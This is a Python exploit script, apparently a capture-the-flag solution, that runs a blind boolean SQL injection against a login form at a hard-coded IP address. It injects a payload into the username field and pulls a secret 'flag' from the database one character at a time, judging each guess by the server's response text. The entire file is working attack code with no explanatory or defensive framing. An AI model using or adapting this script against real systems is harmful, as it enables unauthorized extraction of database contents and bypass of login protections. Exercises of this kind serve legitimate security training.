import requests
import sys
import string
import time
BASE_URL = "http://34.130.242.127:8000"
CHARSET = string.ascii_letters + string.digits + "_{}"
flagLen = 100
def sqlInjection(session, position, character):
    injectionSql = f'admin" AND (SELECT substr(flag, {position}, 1) FROM flag) = "{character}" -- '
    data = {
        "name": injectionSql,
        "pass": "password"
    }
    try:
        response = session.post(f"{BASE_URL}/login", data=data)
        return response
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
        sys.exit(1)
def flagExtraction():
    session = requests.Session()
    flag = ""
    position = 1 
    while position <= flagLen:
        found = False
        for char in CHARSET:
            response = sqlInjection(session, position, char)
            if "Login Failed" in response.text:
                flag += char
                found = True
                break
            elif "Login Error" in response.text:
                continue
            else:
                continue
        if not found:
            break
        position += 1
        time.sleep(0.1)
    return flag
def main():
    flag = flagExtraction()
    if flag:
        print(flag)
        sys.exit(0)
    else:
        print("Failed to retrieve the flag.")
        sys.exit(1)
if __name__ == "__main__":
    main()
